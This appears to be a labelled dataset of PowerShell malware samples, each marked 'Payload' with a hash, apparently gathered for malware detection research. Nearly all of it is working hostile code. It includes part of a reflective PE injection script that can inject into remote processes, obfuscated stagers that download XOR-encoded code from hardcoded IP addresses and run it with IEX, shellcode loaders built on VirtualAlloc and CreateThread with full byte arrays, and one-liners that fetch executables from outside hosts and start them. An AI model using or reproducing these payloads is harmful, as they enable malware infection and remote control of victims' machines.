		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			
			
			
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose ""Calling function with WString return type""
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""WStringFunc""
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose ""Calling function with String return type""
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""StringFunc""
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose ""Calling function with Void return type""
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw ""Couldn't find function address.""
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			
			
			
		}
		
		elseif (($PEInfo.FileType -ieq ""DLL"") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName ""VoidFunc""
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw ""VoidFunc couldn't be found in the DLL""
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		
        
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq ""DLL"")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning ""Unable to call VirtualFree on the PE's memory. Continuing anyways."" -WarningAction Continue
			}
		}
		
		Write-Verbose ""Done!""
	}

	Main
}


Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters[""Debug""] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[""Debug""].IsPresent)
	{
		$DebugPreference  = ""Continue""
	}
	
	Write-Verbose ""PowerShell ProcessID: $PID""
	
	if ($PsCmdlet.ParameterSetName -ieq ""LocalFile"")
	{
		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	}
	elseif ($PsCmdlet.ParameterSetName -ieq ""WebFile"")
	{
		$WebClient = New-Object System.Net.WebClient
		
		[Byte[]]$PEBytes = $WebClient.DownloadData($PEUrl)
	}
	
	
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    
	
    $PEBytes[0] = 0
    $PEBytes[1] = 0
	
	
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = ""ReflectiveExe $ExeArgs""
	}
	else
	{
		$ExeArgs = ""ReflectiveExe""
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch ""^\s*$"")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}",Payload
df2bbbb4c6cce816fc339621c4074de050bb7a61888a74a73468538dec4e96be,"
[SYSTEM.NeT.SerVicEPoiNTMANAGEr]::EXPecT100CoNTINUE = 0;$wC=New-ObJecT SySTEM.NeT.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAdERs.AdD('User-Agent',$u);$Wc.PROXY = [SySTeM.Net.WEbReQUeST]::DefAUltWebPrOxy;$wC.PRoXy.CReDenTialS = [SYsTeM.NEt.CredEntiAlCaCHe]::DEFAuLtNetWORkCredeNtIals;$K='1<`6et&Uj9igI|{L^m>A27k]NTB5YVGf';$I=0;[ChaR[]]$B=([cHar[]]($wc.DOwnLoADSTrINg(""http://64.137.176.174:12345/index.asp"")))|%{$_-BXoR$K[$I++%$k.LeNgtH]};IEX ($b-Join'')

",Payload
bdb2eb53807327abf906c4d6158c34edc4487078915ec6c02a15e5ed85cc9c2f,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xd0,0xd1,0x8d,0x5a,0xda,0xd7,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xed,0xfc,0x03,0x7d,0xdf,0x33,0x78,0xa6,0x37,0x31,0x83,0x57,0xc7,0x56,0x0d,0xb2,0xf6,0x56,0x69,0xb6,0xa8,0x66,0xf9,0x9a,0x44,0x0c,0xaf,0x0e,0xdf,0x60,0x78,0x20,0x68,0xce,0x5e,0x0f,0x69,0x63,0xa2,0x0e,0xe9,0x7e,0xf7,0xf0,0xd0,0xb0,0x0a,0xf0,0x15,0xac,0xe7,0xa0,0xce,0xba,0x5a,0x55,0x7b,0xf6,0x66,0xde,0x37,0x16,0xef,0x03,0x8f,0x19,0xde,0x95,0x84,0x43,0xc0,0x14,0x49,0xf8,0x49,0x0f,0x8e,0xc5,0x00,0xa4,0x64,0xb1,0x92,0x6c,0xb5,0x3a,0x38,0x51,0x7a,0xc9,0x40,0x95,0xbc,0x32,0x37,0xef,0xbf,0xcf,0x40,0x34,0xc2,0x0b,0xc4,0xaf,0x64,0xdf,0x7e,0x14,0x95,0x0c,0x18,0xdf,0x99,0xf9,0x6e,0x87,0xbd,0xfc,0xa3,0xb3,0xb9,0x75,0x42,0x14,0x48,0xcd,0x61,0xb0,0x11,0x95,0x08,0xe1,0xff,0x78,0x34,0xf1,0xa0,0x25,0x90,0x79,0x4c,0x31,0xa9,0x23,0x18,0xf6,0x80,0xdb,0xd8,0x90,0x93,0xa8,0xea,0x3f,0x08,0x27,0x46,0xb7,0x96,0xb0,0xa9,0xe2,0x6f,0x2e,0x54,0x0d,0x90,0x66,0x92,0x59,0xc0,0x10,0x33,0xe2,0x8b,0xe0,0xbc,0x37,0x21,0xe4,0x2a,0xb2,0xb7,0x82,0x95,0xaa,0xb5,0x4a,0xe8,0x91,0x33,0xac,0xba,0xb5,0x13,0x61,0x7a,0x66,0xd4,0xd1,0x12,0x6c,0xdb,0x0e,0x02,0x8f,0x31,0x27,0xa8,0x60,0xec,0x1f,0x44,0x18,0xb5,0xd4,0xf5,0xe5,0x63,0x91,0x35,0x6d,0x80,0x65,0xfb,0x86,0xed,0x75,0x6b,0x67,0xb8,0x24,0x3d,0x78,0x16,0x42,0xc1,0xec,0x9d,0xc5,0x96,0x98,0x9f,0x30,0xd0,0x06,0x5f,0x17,0x6b,0x8e,0xf5,0xd8,0x03,0xef,0x19,0xd9,0xd3,0xb9,0x73,0xd9,0xbb,0x1d,0x20,0x8a,0xde,0x61,0xfd,0xbe,0x73,0xf4,0xfe,0x96,0x20,0x5f,0x97,0x14,0x1f,0x97,0x38,0xe6,0x4a,0x29,0x04,0x31,0xb2,0x5f,0x64,0x81;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
40063fca7e3212690bbd789d44493567d5049875ebd40592ea59b5bc50588d5a,"
$WC=NEW-ObjeCt SYStEm.NEt.WEBCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PROxY = [SYStEm.NET.WeBReQueSt]::DefAultWeBPROxy;$Wc.ProXY.CrEDentIALS = [SYsteM.NEt.CRedenTIaLCACHe]::DEFaUltNeTWOrKCrEDENtIaLS;$K='ZblE7)|

",Payload
c801786f584f0df5023ce939384f4df67439e5b72ed95808580b94bc8d898bcb,"
(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'

",Payload
95deb374a58f127189d7a6c1b103fb1e48da10cee521fb4457033828c2459af8,"
$Teh = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Teh -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x4e,0xa7,0xbf,0x9d,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x41,0x45,0x4a,0x61,0xb5,0x0b,0xb5,0x9a,0x45,0x6c,0x3f,0x7f,0x74,0xac,0x5b,0x0b,0x26,0x1c,0x2f,0x59,0xca,0xd7,0x7d,0x4a,0x59,0x95,0xa9,0x7d,0xea,0x10,0x8c,0xb0,0xeb,0x09,0xec,0xd3,0x6f,0x50,0x21,0x34,0x4e,0x9b,0x34,0x35,0x97,0xc6,0xb5,0x67,0x40,0x8c,0x68,0x98,0xe5,0xd8,0xb0,0x13,0xb5,0xcd,0xb0,0xc0,0x0d,0xef,0x91,0x56,0x06,0xb6,0x31,0x58,0xcb,0xc2,0x7b,0x42,0x08,0xee,0x32,0xf9,0xfa,0x84,0xc4,0x2b,0x33,0x64,0x6a,0x12,0xfc,0x97,0x72,0x52,0x3a,0x48,0x01,0xaa,0x39,0xf5,0x12,0x69,0x40,0x21,0x96,0x6a,0xe2,0xa2,0x00,0x57,0x13,0x66,0xd6,0x1c,0x1f,0xc3,0x9c,0x7b,0x03,0xd2,0x71,0xf0,0x3f,0x5f,0x74,0xd7,0xb6,0x1b,0x53,0xf3,0x93,0xf8,0xfa,0xa2,0x79,0xae,0x03,0xb4,0x22,0x0f,0xa6,0xbe,0xce,0x44,0xdb,0x9c,0x86,0xa9,0xd6,0x1e,0x56,0xa6,0x61,0x6c,0x64,0x69,0xda,0xfa,0xc4,0xe2,0xc4,0xfd,0x2b,0xd9,0xb1,0x92,0xd2,0xe2,0xc1,0xbb,0x10,0xb6,0x91,0xd3,0xb1,0xb7,0x79,0x24,0x3e,0x62,0x17,0x21,0xa8,0x4d,0x40,0x28,0x43,0x26,0x93,0x2b,0x92,0x0a,0x1a,0xcd,0xc4,0x22,0x4d,0x42,0xa4,0x92,0x2d,0x32,0x4c,0xf9,0xa1,0x6d,0x6c,0x02,0x68,0x06,0x06,0xed,0xc5,0x7e,0xbe,0x94,0x4f,0xf4,0x5f,0x58,0x5a,0x70,0x5f,0xd2,0x69,0x84,0x11,0x13,0x07,0x96,0xc5,0xd3,0x52,0xc4,0x43,0xeb,0x48,0x63,0x6b,0x79,0x77,0x22,0x3c,0x15,0x75,0x13,0x0a,0xba,0x86,0x76,0x01,0x73,0x13,0x39,0x7d,0x7c,0xf3,0xb9,0x7d,0x2a,0x99,0xb9,0x15,0x8a,0xf9,0xe9,0x00,0xd5,0xd7,0x9d,0x99,0x40,0xd8,0xf7,0x4e,0xc2,0xb0,0xf5,0xa9,0x24,0x1f,0x05,0x9c,0xb4,0x63,0xd0,0xd8,0xc2,0x8d,0xe0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$3uZS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($3uZS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$3uZS,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
0b3066d1e171e168973179c4397aa99ecca50102f289d742e01092f275cc820e,"
$Wc=NEW-ObJeCT SySTem.Net.WeBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAderS.Add('User-Agent',$u);$Wc.PrOXY = [SYSteM.NeT.WEBREQUESt]::DeFAULTWEBPrOXy;$Wc.PRoXy.CreDeNTiaLs = [SYSTeM.NEt.CreDeNtIalCacHE]::DeFaultNeTWorKCReDENtialS;$K='/j(\wly4+aW

",Payload
5d6c0fe4b65e478e6a91c3936583e9475561d569423bd4ed154da81ca3863af2,"
[SySTeM.Net.SERVICEPoiNtMANaGer]::Expect100ConTINUE = 0;$WC=NeW-OBjeCt SystEm.NET.WEBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADeRS.Add('User-Agent',$u);$wc.ProxY = [SYsTeM.NET.WebREqueST]::DefAultWEbPRoXY;$WC.Proxy.CREDeNtIaLS = [SySTeM.Net.CREDEnTiaLCACHe]::DEFAULtNeTWORkCreDeNtIAls;$K='!*7gfZD\K[q1%W)w|dcx=?ovn}@(SOV+';$i=0;[CHAR[]]$b=([cHar[]]($wC.DoWNlOAdStrinG(""http://192.168.2.37:8080/index.asp"")))|%{$_-BXOR$k[$I++%$k.LENGTh]};IEX ($B-joIn'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
fec6779d4d6bd700f980dd3c7dfcb3c20665c15d4731e69e8576c1b43b898384,"
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/com.exe','mess.exe');Start-Process 'mess.exe'

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
0bc16b936f8ef23a859edcd12bf26665eec2ccd75ca093825c37ab1f61e0764f,"function Invoke-Nancy
{


[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	
	
	
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		
		
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		
		
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
